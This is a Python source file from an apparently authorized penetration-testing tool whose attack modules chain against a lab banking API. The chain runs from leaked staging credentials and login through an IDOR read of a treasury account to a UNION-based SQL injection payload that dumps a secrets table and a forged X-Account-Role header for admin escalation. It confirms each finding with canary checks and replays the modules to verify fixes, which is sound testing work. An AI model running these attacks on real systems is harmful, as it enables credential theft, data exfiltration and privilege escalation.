"""Attack modules: bounded exploitation + deterministic validation per weakness.

Each module (a) uses the typed HTTP tool to interact with the target, (b) applies
an EXPLICIT success criterion to the captured responses, and (c) returns evidence.
A module reports CONFIRMED only when its deterministic criterion is met — the
model never asserts a vulnerability on its own.

The very same modules are replayed by the retest engine against a patched
instance, where the criterion is expected to FAIL — that is the proof of a fix.
"""
from __future__ import annotations

import json

from dracarys.agents.context import AttackContext, AttackOutcome, LabeledExchange
from dracarys.domain.enums import Severity, TestOutcome, VulnCategory
from dracarys.tools import HttpRequestSpec, HttpTool

# UNION-based payload crafted by the attacker (not shared with the target).
SQLI_UNION_PAYLOAD = (
    "zzz%' UNION SELECT secret_name, secret_value, 'secret' FROM secrets -- "
)
SQLI_CONTROL_QUERY = "Alice"


def _json(exchange) -> dict | list | None:
    try:
        return json.loads(exchange.body_text)
    except (ValueError, TypeError):
        return None


class AttackModule:
    id: str
    category: VulnCategory
    severity: Severity
    title: str
    depends_on: list[str] = []

    async def run(self, tool: HttpTool, ctx: AttackContext) -> AttackOutcome:  # pragma: no cover
        raise NotImplementedError

    def _inconclusive(self, reason: str, hypothesis: str, criteria: str) -> AttackOutcome:
        return AttackOutcome(
            module_id=self.id,
            category=self.category,
            severity=self.severity,
            outcome=TestOutcome.INCONCLUSIVE,
            title=self.title,
            hypothesis=hypothesis,
            success_criteria=criteria,
            detail=reason,
        )


class InfoDisclosureAttack(AttackModule):
    id = "LAB-INFO-001"
    category = VulnCategory.INFO_DISCLOSURE
    severity = Severity.HIGH
    title = "Verbose status endpoint discloses staging credentials"

    async def run(self, tool, ctx):
        hypothesis = (
            "The diagnostic endpoint may expose internal detail when asked to be "
            "verbose."
        )
        criteria = (
            "GET /api/system/status?verbose=1 returns 200 and the body contains a "
            "usable credential (a debug block with a password)."
        )
        ex = await tool.execute(
            HttpRequestSpec(
                method="GET",
                path="/api/system/status",
                query={"verbose": "1"},
                note="probe diagnostic endpoint for verbose disclosure",
            )
        )
        exchanges = [LabeledExchange("verbose status probe", ex)]
        body = _json(ex)
        creds = None
        discovered = {}
        if isinstance(body, dict):
            debug = body.get("debug") or {}
            seeds = debug.get("seed_accounts") or []
            if seeds and isinstance(seeds, list):
                first = seeds[0]
                if first.get("password"):
                    creds = {
                        "username": first.get("user"),
                        "password": first.get("password"),
                    }
            if "treasury_account_id" in debug:
                discovered["treasury_account_id"] = debug["treasury_account_id"]
            if "account_id_scheme" in debug:
                discovered["account_id_scheme"] = debug["account_id_scheme"]

        if ex.status_code == 200 and creds:
            return AttackOutcome(
                module_id=self.id,
                category=self.category,
                severity=self.severity,
                outcome=TestOutcome.CONFIRMED,
                title=self.title,
                hypothesis=hypothesis,
                success_criteria=criteria,
                detail=(
                    f"Disclosed staging credential for user '{creds['username']}' "
                    "and internal account numbering in the debug block."
                ),
                root_cause=(
                    "Diagnostic endpoint returns internal debug material to "
                    "unauthenticated clients based on a query flag."
                ),
                impact="Attacker obtains valid credentials without authenticating.",
                affected_asset="GET /api/system/status",
                exchanges=exchanges,
                extracted={"leaked_credentials": creds, "discovered": discovered},
            )
        return AttackOutcome(
            module_id=self.id, category=self.category, severity=self.severity,
            outcome=TestOutcome.DISPROVEN, title=self.title, hypothesis=hypothesis,
            success_criteria=criteria,
            detail="No credential disclosed in the diagnostic response.",
            exchanges=exchanges,
        )


class BrokenAuthAttack(AttackModule):
    id = "LAB-AUTH-001"
    category = VulnCategory.BROKEN_AUTH
    severity = Severity.HIGH
    title = "Exposed staging account is a live production login"
    depends_on = ["LAB-INFO-001"]

    async def run(self, tool, ctx):
        hypothesis = (
            "Credentials exposed by information disclosure may authenticate against "
            "the production login."
        )
        criteria = (
            "POST /api/login with the leaked credentials returns a token that "
            "authenticates as the leaked user on GET /api/me."
        )
        if not ctx.leaked_credentials:
            return self._inconclusive(
                "No leaked credentials available yet (depends on LAB-INFO-001).",
                hypothesis, criteria,
            )
        creds = ctx.leaked_credentials
        login = await tool.execute(
            HttpRequestSpec(
                method="POST", path="/api/login", json_body=creds,
                note="attempt login with leaked staging credentials",
            )
        )
        exchanges = [LabeledExchange("login with leaked credentials", login)]
        body = _json(login)
        token = body.get("access_token") if isinstance(body, dict) else None
        if login.status_code == 200 and token:
            me = await tool.execute(
                HttpRequestSpec(
                    method="GET", path="/api/me",
                    headers={"Authorization": f"Bearer {token}"},
                    note="confirm authenticated session identity",
                )
            )
            exchanges.append(LabeledExchange("verify session via /api/me", me))
            me_body = _json(me)
            username = me_body.get("username") if isinstance(me_body, dict) else None
            role = me_body.get("role") if isinstance(me_body, dict) else None
            if me.status_code == 200 and username == creds.get("username"):
                return AttackOutcome(
                    module_id=self.id, category=self.category, severity=self.severity,
                    outcome=TestOutcome.CONFIRMED, title=self.title,
                    hypothesis=hypothesis, success_criteria=criteria,
                    detail=(
                        f"Leaked credentials authenticated as '{username}' "
                        f"(role={role}); obtained a working bearer token."
                    ),
                    root_cause=(
                        "A staging service account remained enabled in production "
                        "with a known, leaked password."
                    ),
                    impact="Attacker gains an authenticated foothold.",
                    affected_asset="POST /api/login",
                    exchanges=exchanges,
                    extracted={
                        "tokens": {username: token},
                        "identities": {username: {"role": role}},
                    },
                )
        return AttackOutcome(
            module_id=self.id, category=self.category, severity=self.severity,
            outcome=TestOutcome.DISPROVEN, title=self.title, hypothesis=hypothesis,
            success_criteria=criteria,
            detail="Leaked credentials did not yield a valid session.",
            exchanges=exchanges,
        )


class IdorAttack(AttackModule):
    id = "LAB-IDOR-001"
    category = VulnCategory.IDOR
    severity = Severity.CRITICAL
    title = "Broken object-level authorization reaches the treasury canary"
    depends_on = ["LAB-AUTH-001"]

    async def run(self, tool, ctx):
        hypothesis = (
            "Account reads may not verify ownership, letting a low-privilege session "
            "read another account (the treasury)."
        )
        criteria = (
            "A non-owner authenticated session GETs the treasury account and the "
            "response body contains the vault recovery canary."
        )
        ident = ctx.any_non_admin_token()
        if ident is None:
            return self._inconclusive(
                "No authenticated session available (depends on LAB-AUTH-001).",
                hypothesis, criteria,
            )
        username, token = ident
        headers = {"Authorization": f"Bearer {token}"}
        treasury_id = int(ctx.discovered.get("treasury_account_id", 9001))

        # Baseline: read our own account to show normal (canary-free) behavior.
        me = await tool.execute(
            HttpRequestSpec(path="/api/me", headers=headers, note="determine own account")
        )
        me_body = _json(me)
        own_account = me_body.get("primary_account") if isinstance(me_body, dict) else None
        exchanges = []
        if own_account:
            own = await tool.execute(
                HttpRequestSpec(
                    path=f"/api/accounts/{own_account}", headers=headers,
                    note="baseline read of own account (control)",
                )
            )
            exchanges.append(LabeledExchange("control: own account", own))

        # Attack: read the treasury account we do not own.
        treasury = await tool.execute(
            HttpRequestSpec(
                path=f"/api/accounts/{treasury_id}", headers=headers,
                note="attempt cross-account read of treasury (IDOR)",
            )
        )
        exchanges.append(LabeledExchange("IDOR: cross-account treasury read", treasury))

        if treasury.status_code == 200 and treasury.contains(ctx.canary_token):
            return AttackOutcome(
                module_id=self.id, category=self.category, severity=self.severity,
                outcome=TestOutcome.CONFIRMED, title=self.title,
                hypothesis=hypothesis, success_criteria=criteria,
                detail=(
                    f"Session '{username}' read treasury account {treasury_id} it "
                    "does not own; the response contained the vault recovery canary."
                ),
                root_cause=(
                    "The account endpoint returns records by id without checking "
                    "that the caller owns the object (missing object-level authz)."
                ),
                impact="Full compromise of the protected treasury resource.",
                affected_asset=f"GET /api/accounts/{treasury_id}",
                exchanges=exchanges,
                reached_canary=True,
                extracted={"reached_canary": True, "canary_via": ["LAB-IDOR-001"]},
            )
        return AttackOutcome(
            module_id=self.id, category=self.category, severity=self.severity,
            outcome=TestOutcome.DISPROVEN, title=self.title, hypothesis=hypothesis,
            success_criteria=criteria,
            detail=(
                f"Cross-account read returned status {treasury.status_code} without "
                "the canary; object-level authorization appears enforced."
            ),
            exchanges=exchanges,
        )


class SqlInjectionAttack(AttackModule):
    id = "LAB-SQL-001"
    category = VulnCategory.SQL_INJECTION
    severity = Severity.CRITICAL
    title = "UNION-based SQL injection exfiltrates the secrets table"
    depends_on = ["LAB-AUTH-001"]

    async def run(self, tool, ctx):
        hypothesis = (
            "The account search parameter may be concatenated into SQL, allowing a "
            "UNION-based read of other tables."
        )
        criteria = (
            "A benign control query does NOT return the canary, while a UNION "
            "injection query DOES return the canary from the secrets table."
        )
        ident = ctx.any_non_admin_token()
        if ident is None:
            return self._inconclusive(
                "No authenticated session available (depends on LAB-AUTH-001).",
                hypothesis, criteria,
            )
        _username, token = ident
        headers = {"Authorization": f"Bearer {token}"}

        control = await tool.execute(
            HttpRequestSpec(
                path="/api/accounts/search", query={"q": SQLI_CONTROL_QUERY},
                headers=headers, note="benign control search",
            )
        )
        injection = await tool.execute(
            HttpRequestSpec(
                path="/api/accounts/search", query={"q": SQLI_UNION_PAYLOAD},
                headers=headers, note="UNION-based injection to exfiltrate secrets",
            )
        )
        exchanges = [
            LabeledExchange("control: benign search", control),
            LabeledExchange("injection: UNION exfiltration", injection),
        ]
        control_clean = not control.contains(ctx.canary_token)
        injection_leaks = (
            injection.status_code == 200 and injection.contains(ctx.canary_token)
        )
        if control_clean and injection_leaks:
            return AttackOutcome(
                module_id=self.id, category=self.category, severity=self.severity,
                outcome=TestOutcome.CONFIRMED, title=self.title,
                hypothesis=hypothesis, success_criteria=criteria,
                detail=(
                    "The control query returned no secret, but the UNION injection "
                    "returned the vault recovery canary from the secrets table, "
                    "proving arbitrary data exfiltration."
                ),
                root_cause=(
                    "The search query is assembled by string concatenation instead "
                    "of parameterization, permitting UNION-based injection."
                ),
                impact="Database exfiltration reaching the protected canary.",
                affected_asset="GET /api/accounts/search",
                exchanges=exchanges,
                reached_canary=True,
                extracted={"reached_canary": True, "canary_via": ["LAB-SQL-001"]},
            )
        return AttackOutcome(
            module_id=self.id, category=self.category, severity=self.severity,
            outcome=TestOutcome.DISPROVEN, title=self.title, hypothesis=hypothesis,
            success_criteria=criteria,
            detail=(
                "Injection did not exfiltrate the canary; the parameter appears to "
                "be parameterized."
            ),
            exchanges=exchanges,
        )


class MisconfigPrivEscAttack(AttackModule):
    id = "LAB-MISCONFIG-001"
    category = VulnCategory.PRIVILEGE_ESCALATION
    severity = Severity.HIGH
    title = "Admin endpoint trusts a client-supplied role header"
    depends_on = ["LAB-AUTH-001"]

    async def run(self, tool, ctx):
        hypothesis = (
            "The admin endpoint may authorize on a client-controlled header instead "
            "of the session role."
        )
        criteria = (
            "GET /api/admin/users is 403 for a non-admin session, but returns 200 "
            "with user records when the same session sends X-Account-Role: admin."
        )
        ident = ctx.any_non_admin_token()
        if ident is None:
            return self._inconclusive(
                "No non-admin session available (depends on LAB-AUTH-001).",
                hypothesis, criteria,
            )
        username, token = ident
        base = {"Authorization": f"Bearer {token}"}

        without = await tool.execute(
            HttpRequestSpec(
                path="/api/admin/users", headers=base,
                note="baseline: admin dump without forged header (control)",
            )
        )
        withhdr = await tool.execute(
            HttpRequestSpec(
                path="/api/admin/users",
                headers={**base, "X-Account-Role": "admin"},
                note="privilege escalation via forged role header",
            )
        )
        exchanges = [
            LabeledExchange("control: no forged header", without),
            LabeledExchange("attack: forged X-Account-Role header", withhdr),
        ]
        wbody = _json(withhdr)
        dumped = isinstance(wbody, dict) and bool(wbody.get("users"))
        if without.status_code == 403 and withhdr.status_code == 200 and dumped:
            return AttackOutcome(
                module_id=self.id, category=self.category, severity=self.severity,
                outcome=TestOutcome.CONFIRMED, title=self.title,
                hypothesis=hypothesis, success_criteria=criteria,
                detail=(
                    f"Non-admin session '{username}' was denied (403) without the "
                    "header but dumped all user records (200) by sending "
                    "X-Account-Role: admin."
                ),
                root_cause=(
                    "Authorization is derived from a client-supplied header rather "
                    "than the authenticated session's role."
                ),
                impact="Privilege escalation exposing admin-only user data.",
                affected_asset="GET /api/admin/users",
                exchanges=exchanges,
                extracted={"escalated": True},
            )
        return AttackOutcome(
            module_id=self.id, category=self.category, severity=self.severity,
            outcome=TestOutcome.DISPROVEN, title=self.title, hypothesis=hypothesis,
            success_criteria=criteria,
            detail="Forged header did not change authorization; endpoint is safe.",
            exchanges=exchanges,
        )


# Registry and dependency-respecting execution order.
ATTACK_MODULES: dict[str, AttackModule] = {
    m.id: m
    for m in [
        InfoDisclosureAttack(),
        BrokenAuthAttack(),
        IdorAttack(),
        SqlInjectionAttack(),
        MisconfigPrivEscAttack(),
    ]
}

EXECUTION_ORDER = [
    "LAB-INFO-001",
    "LAB-AUTH-001",
    "LAB-IDOR-001",
    "LAB-SQL-001",
    "LAB-MISCONFIG-001",
]


def modules_in_order() -> list[AttackModule]:
    return [ATTACK_MODULES[mid] for mid in EXECUTION_ORDER]
